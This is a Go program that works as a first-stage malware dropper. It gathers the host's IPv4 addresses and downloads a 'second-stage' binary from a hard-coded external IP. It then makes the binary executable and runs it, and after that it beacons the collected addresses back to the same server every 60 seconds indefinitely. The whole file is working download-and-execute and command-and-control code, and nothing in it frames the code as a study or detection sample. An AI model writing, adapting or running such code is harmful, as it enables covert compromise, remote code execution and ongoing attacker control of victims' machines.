package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
	"encoding/json"
)

func http_post(url string, jsonStr []byte) error {

        req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
        req.Header.Set("X-Custom-Header", "myvalue")
        req.Header.Set("Content-Type", "application/json")

        client := &http.Client{}
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()

	return err
}

func http_get(url string, filename string) error {

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filename)
        if err != nil {
                return err
        }
        defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func get_ips() ([]string, error) {

	var ips []string

	ifaces, err := net.Interfaces()
	if err != nil {
		return ips, err
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 {
			continue // interface down
		}
		if iface.Flags&net.FlagLoopback != 0 {
			continue // loopback interface
		}
		addrs, err := iface.Addrs()
		if err != nil {
			return ips, err
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			ip = ip.To4()
			if ip == nil {
				continue // not an Ipv4 addr
			}
			ips = append (ips, ip.String())
		}
	}
	return ips, nil
}

func main() {

	// define constants
	const ip = "54.184.116.123"
	const filename = "lw-binary-2"	

        // get host IPs
        ips, ip_err := get_ips()
        if ip_err != nil {
                panic(ip_err)
        }

	// convert ip list slice to json
	body, err := json.Marshal(ips)
	if err != nil {
		fmt.Printf("Error: %s", err.Error())
	}

	// download second stage file
	get_url := fmt.Sprintf("http://%s/second-stage/%s", ip, filename)

	get_err := http_get(get_url, filename)
	if get_err != nil {
		panic(get_err)
	}

	// make file executable
	chmod_err := os.Chmod(filename, 0777)
	if err != nil {
		panic(chmod_err)
	}

	// get current path
	path, path_err := os.Getwd()
	if path_err != nil {
		panic (path_err)
	}

	// execute second stage binary
	command := exec.Command(path+"/"+filename)
	exec_err := command.Run()
	if exec_err != nil {
		panic(exec_err)
	}

        // beacon home every 60 seconds forever
	post_url := fmt.Sprintf("http://%s/lw-beacon", ip)
	for {
	        post_err := http_post(post_url, body)
	        if post_err != nil {
	                panic(post_err)
	        }
		time.Sleep(60 * time.Second)
	}

}
